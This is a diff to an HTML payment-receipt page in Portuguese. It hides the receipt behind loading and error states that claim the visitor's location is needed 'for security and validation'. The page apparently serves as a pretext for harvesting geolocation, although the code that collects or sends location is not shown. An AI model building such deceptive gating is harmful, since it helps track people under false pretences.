@@ -10,20 +10,47 @@
 
 <body>
   <div class="comprovante-container">
-    <h1>Comprovante de Recebimento</h1>
-
-    <div class="informacoes">
-      <p><span>Data:</span> <span id="data-atual"></span></p>
-      <p><span>Valor Recebido:</span> <span id="valor-recebido" class="dado-comprovante">R$ 1.000,00</span></p>
-      <p><span>De:</span> <span id="nome-remetente" class="dado-comprovante">João Silva de Oliveira</span></p>
-      <p><span>Status:</span> Recebido com Sucesso</p>
+    <!-- Estado de carregamento/aguardando permissão -->
+    <div id="estado-carregamento" class="estado-mensagem">
+      <div class="spinner"></div>
+      <p>Verificando dados de segurança...</p>
     </div>
 
-    <button class="botao" onclick="window.print()">Imprimir</button>
+    <!-- Estado de erro - permissão negada -->
+    <div id="estado-erro-permissao" class="estado-mensagem estado-erro" hidden>
+      <p>⚠️ A localização é necessária por motivos de segurança e validação para acessar o comprovante.</p>
+      <button id="botao-tentar-permissao" class="botao">Tentar novamente</button>
+    </div>
 
-    <div class="comprovante-footer">
-      <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
-      <p><a href="#">Clique aqui</a> para mais informações.</p>
+    <!-- Estado de erro - timeout/expirado -->
+    <div id="estado-erro-timeout" class="estado-mensagem estado-erro" hidden>
+      <p>⏱️ O tempo de segurança expirou. Solicite um novo acesso.</p>
+      <button id="botao-emitir-novamente" class="botao">Emitir novamente</button>
+    </div>
+
+    <!-- Estado de erro - erro genérico -->
+    <div id="estado-erro-generico" class="estado-mensagem estado-erro" hidden>
+      <p>❌ Não foi possível validar sua localização. Tente novamente mais tarde.</p>
+      <button id="botao-tentar-generico" class="botao">Tentar novamente</button>
+    </div>
+
+    <!-- Comprovante (inicialmente oculto) -->
+    <div id="conteudo-comprovante" hidden>
+      <h1>Comprovante de Recebimento</h1>
+
+      <div class="informacoes">
+        <p><span>Data:</span> <span id="data-atual"></span></p>
+        <p><span>Valor Recebido:</span> <span id="valor-recebido" class="dado-comprovante">R$ 1.000,00</span></p>
+        <p><span>De:</span> <span id="nome-remetente" class="dado-comprovante">João Silva de Oliveira</span></p>
+        <p><span>Status:</span> Recebido com Sucesso</p>
+      </div>
+
+      <button class="botao" onclick="window.print()">Imprimir</button>
+
+      <div class="comprovante-footer">
+        <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
+        <p><a href="#">Clique aqui</a> para mais informações.</p>
+      </div>
     </div>
   </div>
 
